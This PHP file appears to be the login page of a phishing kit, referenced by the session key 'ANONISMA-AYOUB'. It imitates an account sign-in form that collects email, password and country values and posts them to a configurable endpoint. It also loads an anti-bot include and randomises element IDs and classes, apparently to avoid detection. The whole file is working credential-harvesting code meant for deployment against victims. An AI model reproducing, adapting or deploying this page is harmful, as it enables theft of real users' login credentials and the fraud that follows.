<?php
//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./info.php');
	include('./includes/lang.php');
	include('./includes/bots.php');	
	include "./includes/lang".$_SESSION['ANONISMA-AYOUB'];
	//---------------------------------------------------------------------------------------- LOG
	die("<!DOCTYPE html>
	<html lang=\"en\">
	  <head>
		<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
		<meta charset=\"utf-8\">
		<title>   ".$aaaaaaaal21."  -  ".$_SESSION['AYCOUNT']."  </title>
		<link rel=\"stylesheet\" href=\"./lib/css/bootstrap.css\">
		<link rel=\"shortcut icon\" link rel=\"logo-icon\" href=\"lib/css/img/anon-7.png\">
		<meta name=\"viewport\" content=\"initial-scale=1.0\">
	  </head>
	  <body>
		<div  class=\"".X()."\"  id=\"page\">
		  <div   for=\"".X()."\" id=\"content\" class=\"xbxnq\">
			<header>
			  <div id=\"".X()."\" class=\"bxc4\"></div>
			</header>
			<div id=\"ncx8d\" class=\"ncx8d \">
			  <section id=\"ieswn\" class=\"ieswn\">
				<form  for=\" ".Y()." \"  ".$Edit_Curl." method=\"post\" class=\"proceed maskable\" id=\"usns\" name=\"login\">
				".Ghalat_Assi($_GET["login-error"], $aaaaaaaal34)."
				<div id=\"pok4\" class=\"footer-sec\">
				  <div class=\"oower\" id=\"qoeocx\">
					<div class=\"oower\" style=\"z-index: 100;\">
					<div  for=\"".X()."\"  class=\"poiuy bxb3\">
					  <input  for=\" ".Y()." \"  class=\"poosd\" name=\"EM\" type=\"email\" placeholder=\" ".$aaaaaaaal23." \" id=\"bxn34\">
					</div>
					<div  id=\"".Y()."\"  class=\"rtols\">
					  <p> ".$aaaaaaaal24." </p>
					</div>
				  </div>
				  <div  id=\"".Y()."\"  class=\"oower\">
					<div id=\"".X()."\" class=\"poiuy bxb3\">
					  <input  for=\" ".Y()." \"  class=\"poosd\"  name=\"PS\" type=\"password\" placeholder=\" ".$aaaaaaaal25." \" id=\"password\">	
					  <input type=\"hidden\" name=\"CN\"  value=\"".$_SESSION['AYCOUNT']."\" >											
					</div>
					<div  id=\"".X()."\"  class=\"rtols\">
					  <p  id=\"".Y()."\" > ".$aaaaaaaal26." </p>
					</div>
				  </div>
				</div>
				<div id=\"".Y()."\" class=\"af3al adfsf\">
				  <button  for=\" ".Y()." \"  class=\"button oowxs\" type=\"submit\" id=\"botdkhol\" name=\"botdkhol\" value=\"Login\"> ".$aaaaaaaal27." </button>
				</div>
				<div id=\"".X()."\" class=\"lineab\">
				  <a href=\"#\" id=\"uwuwu\" class=\"nsiti-pass\"> ".$aaaaaaaal28." </a>
				  <div class=\"pwr-modal\" id=\"qzxz\">
				  </div>
				</div>
				</form><a  for=\"".X()."\"  href=\"#\" class=\"button tanitalt\" id=\"ftahcont-jdid\"> ".$aaaaaaaal29." </a>
			  </section>
			  <br>
			</div>
		  </div>
		  <div id=\"".X()."\" class=\"lsksl\">
			<p  id=\"".Y()."\"  class=\"mosl\"> ".$aaaaaaaal42." </p>
		  </div>
		</div>
		<footer id=\"".X()."\" class=\"footer footer-sec\">
		  <ul>
			<li  id=\"".Y()."\" ><a href=\"#\"> ".$aaaaaaaal30." </a></li>
			<li  id=\"".X()."\" ><a href=\"#\"> ".$aaaaaaaal31." </a></li>
			<li  id=\"".Y()."\" ><a href=\"#\"> ".$aaaaaaaal32." </a></li>
		  </ul>
		  <br>
		  <ul id=\"".X()."\">
			<li id=\"".X()."\"><a href=\"#\">Copyright © 1999 -  ".date("Y")." . ".$aaaaaaaal33." </a></li>
		  </ul>
		</footer>
		<script type=\"text/javascript\" src=\"./lib/js/jquery.1.11.1.min.js\"></script>
		<script type=\"text/javascript\" src=\"./lib/js/login.js\"></script>
	  </body>
	</html>
	\n");
?>
